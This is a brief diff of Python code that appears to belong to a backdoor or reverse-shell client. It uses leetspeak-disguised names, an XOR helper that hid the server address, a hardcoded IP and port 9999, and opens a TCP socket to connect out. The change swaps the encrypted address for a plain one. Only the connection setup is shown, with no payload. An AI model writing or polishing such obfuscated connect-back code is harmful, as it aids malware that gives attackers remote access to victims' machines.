@@ -17,8 +17,7 @@ def xor_encrypt_decrypt(data, key):
 # XOR key for encryption
 XOR_KEY = 123  # Choose a key for XOR encryption (ensure it's a single byte)
 
-# Connect to the server
-S3RV3R_IP = xor_encrypt_decrypt("10.0.1.33", XOR_KEY)  # Encrypted server IP
+S3RV3R_IP = "10.0.1.33"  # Use actual IP address here
 S3RV3R_P0RT = 9999
 cl1nt_s0ck3t = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
